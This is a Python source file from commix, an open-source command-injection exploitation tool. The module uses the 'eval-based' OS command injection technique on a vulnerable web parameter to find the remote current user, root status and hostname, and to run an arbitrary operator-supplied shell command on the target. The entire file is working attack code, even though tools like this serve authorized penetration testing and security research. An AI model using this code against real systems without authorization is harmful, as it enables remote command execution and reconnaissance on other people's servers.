#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.injections.results_based.techniques.eval_based import eb_injector

"""
 The "eval-based" injection technique on Classic OS Command Injection.
"""

def do_check(separator,TAG,prefix,suffix,http_request_method,url,vuln_parameter):

  # Current user enumeration
  if menu.options.current_user:
    menu.options.verbose = False
    cmd = settings.CURRENT_USER
    response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
    shell = eb_injector.injection_results(response,TAG)
    if shell:
      shell = "".join(str(p) for p in shell).replace(" ", "", 1)
      print "  (+) Current User : "+ colors.YELLOW + colors.BOLD + shell + colors.RESET + ""

  # Is-root enumeration
  if menu.options.is_root:
    cmd = settings.ISROOT
    response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
    shell = eb_injector.injection_results(response,TAG)
    if shell:
      sys.stdout.write( "  (+) Current user have root privs :")
      sys.stdout.flush()
      shell = "".join(str(p) for p in shell)
      if shell != "0":
	print colors.RED + " FALSE "+colors.RESET
      else:
	print colors.GREEN + " TRUE "+colors.RESET 

  # Hostname enumeration
  if menu.options.hostname:
    menu.options.verbose = False
    cmd = settings.HOSTNAME
    response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
    shell = eb_injector.injection_results(response,TAG)
    if shell:
      shell = "".join(str(p) for p in shell).replace(" ", "", 1)
      print "  (+) Hostname : "+ colors.YELLOW + colors.BOLD +  shell + colors.RESET + ""

  # Single os-shell execution
  if menu.options.os_shell:
    cmd =  menu.options.os_shell
    response = eb_injector.injection(separator,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter)
    shell = eb_injector.injection_results(response,TAG)
    if shell:
      shell = "".join(str(p) for p in shell).replace(" ", "", 1)
      print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET
      sys.exit(0)
		
    
# eof